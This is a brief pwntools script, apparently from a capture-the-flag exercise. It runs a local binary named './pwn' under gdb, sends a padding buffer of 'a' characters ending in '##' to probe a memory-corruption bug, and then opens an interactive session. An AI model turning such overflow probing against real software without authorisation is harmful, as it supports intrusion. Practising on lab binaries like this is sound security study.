from pwn import *

context.terminal = ['gnome-terminal','-x','sh','-c']
io=process('./pwn')

gdb.attach(io)
io.send('a'*(0xff-2)+'##')


io.interactive()
